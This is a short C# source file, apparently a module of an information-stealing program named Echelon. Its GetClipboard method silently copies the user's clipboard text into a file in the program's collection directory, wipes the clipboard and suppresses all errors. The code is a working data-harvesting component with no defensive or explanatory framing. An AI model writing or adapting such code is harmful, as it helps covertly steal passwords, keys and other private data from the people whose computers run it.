


using System.IO;
using System.Windows;

namespace Echelon
{
    public static class BuffBoard
    {
        public static void GetClipboard(string Echelon_Dir)
        {
            try
            {
                if (Clipboard.ContainsText())
                {
                    File.WriteAllText(Echelon_Dir + "\\Clipboard.txt", $"[{Help.date}]\r\n\r\n{ClipboardNative.GetText()}\r\n\r\n");
                    NativeMethods.EmptyClipboard();
                }
            }
            catch { }

        }
    }
}
